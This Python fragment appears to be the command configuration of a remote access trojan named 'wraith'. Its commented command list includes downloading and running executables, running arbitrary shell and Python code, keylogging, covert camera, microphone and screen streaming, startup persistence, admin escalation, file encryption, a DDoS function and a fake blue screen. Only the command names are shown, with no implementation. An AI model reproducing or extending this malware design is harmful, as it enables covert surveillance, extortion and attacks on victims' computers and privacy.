# A list of commands which are considered valid. Comment out to disable
valid_commands = [
    "getextip", # Get external IP using third party
    "messagebox", # Show a messagebox
    "tts", # Say something using text to speech
    "download", # Download something off the internet
    "downloadexe", # Download and run an executable
    "upload", # Upload a file to the server
    "pyexec", # Execute some python code
    "shexec", # Execute some shell code
    "playsound", # Play a sound from storage location or URL
    "webopen", # Open a webpage using default browser
    "screenshot", # Take a screenshot and send it to the server
    "screenstream", # Stream the screen to the server
    "camlist", # List cameras present on the host
    "camsnap", # Take a photo with specified camera and send to server
    "camstream", # Stream the specified camera to the server
    "micstream", # Stream audio to server
    "keystream", # Stream pressed keys to server
    "stopscreenstream", # Stop streaming screen
    "stopcamstream", # Stop streaming camera
    "stopmicstream", # Stop streaming microphone
    "stopkeystream", # Stop streaming pressed keys
    "enableonstart", # Enable the wraith to run on system startup
    "requestadmin", # Request admin privileges
    "sendkey", # Send a keyboard event
    "sendmouse", # Send a mouse event
    "cryptfiles", # Encrypt files using passphrase
    "uncryptfiles", # Decrypt files using passphrase
    "listdir", # List a directory
    "remove", # Remove a file or directory
    "create", # Create a file or directory
    "starttask", # Start a program
    "endtask", # Kill a program
    "lstask", # List running tasks
    "lshardware", # List attached hardware
    "osinfo", # Get information about operating system
    "netstat", # List open connections
    "scannet", # Scan the local network (like nmap)
    "packetspam", # DDoS a given host
    "stoppacketspam", # End DDoS attack
    "showbsod", # Show fake blue screen of death
    "endbsod", # Close the fake BSOD
    "shutdown", # Shutdown the computer
    "reboot", # Reboot the computer
    "logout", # Log the user out
    "lockscreen", # Lock the user session
    "wrestart", # Restart the wraith program
    "wrelogin", # Log in again and re-fetch all info
]
